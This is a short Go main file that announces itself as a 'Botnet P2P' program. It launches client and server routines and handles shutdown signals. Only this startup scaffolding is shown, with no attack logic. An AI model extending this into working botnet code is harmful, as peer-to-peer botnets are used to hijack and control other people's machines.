package main

import (
	"os"
	"os/signal"
	"log"
	"syscall"
)

func main() {
	terminate := make(chan struct{})
	log.Println("Botnet P2P booting...")
	go exitHandler(terminate)
	go clientRoutine(terminate)
	serverRoutine(defaultPort, terminate)
}

func exitHandler(term chan struct{}) {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	close(term)
	log.Println("Terminate signal received!")
	//os.Exit(0)
}